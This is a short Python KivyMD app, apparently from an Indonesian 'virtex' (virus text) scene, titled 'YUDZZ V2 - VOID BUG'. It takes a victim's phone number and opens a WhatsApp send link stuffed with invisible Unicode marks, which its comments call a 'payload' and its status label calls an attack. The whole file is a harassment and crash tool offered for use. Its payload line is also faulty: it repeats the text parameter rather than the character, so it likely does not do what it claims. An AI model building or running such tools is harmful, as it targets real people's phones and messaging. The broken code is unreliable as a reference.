from kivymd.app import MDApp
from kivy.lang import Builder
import webbrowser

KV = '''
MDScreen:
    md_bg_color: 0, 0, 0, 1
    FitImage:
        source: "https://media.tenor.com/S_vT-K9lX2QAAAAC/gojo-satoru-jujutsu-kaisen.gif"
        opacity: 0.5
    MDLabel:
        text: "YUDZZ V2 - VOID BUG"
        halign: "center"
        pos_hint: {"center_y": .85}
        font_style: "H4"
        theme_text_color: "Error"
        bold: True
    MDTextField:
        id: target
        hint_text: "Nomor Target (628...)"
        mode: "fill"
        pos_hint: {"center_x": .5, "center_y": .5}
        size_hint_x: .8
    MDRaisedButton:
        text: "KIRIM VIRTEX GANAS"
        md_bg_color: 1, 0, 0, 1
        pos_hint: {"center_x": .5, "center_y": .4}
        on_release: app.kirim_virtex()
    MDLabel:
        id: logs
        text: "Status: Standby"
        halign: "center"
        pos_hint: {"center_y": .3}
        theme_text_color: "Secondary"
'''

class MainApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        return Builder.load_string(KV)

    def kirim_virtex(self):
        num = self.root.ids.target.text
        # Ini link payload virtex ganas (Ghost Unicode)
        payload = "https://api.whatsapp.com/send?phone=" + num + "&text=%E2%80%8E" * 500
        
        if num:
            self.root.ids.logs.text = f"Attacking {num}..."
            webbrowser.open(payload)
        else:
            self.root.ids.logs.text = "Mana nomornya, Bos?"

MainApp().run()
